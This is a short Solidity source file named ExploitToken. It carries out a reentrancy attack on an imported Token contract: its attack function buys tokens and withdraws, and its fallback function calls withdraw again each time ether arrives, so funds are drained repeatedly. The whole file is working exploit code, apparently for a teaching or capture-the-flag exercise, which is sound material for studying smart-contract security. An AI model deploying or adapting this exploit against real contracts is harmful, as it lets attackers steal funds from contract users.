pragma solidity 0.4.24;

import './Token.sol';

contract ExploitToken {
    Token t;
    
    constructor(address target) public {
       t = Token(target);       
    }
    
    function deposit() public payable {
    }
    
    function attack() public {
       t.buy.value(1000)();
       t.withdraw(1000);
    }
    
    function() public payable {
        t.withdraw(1000);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
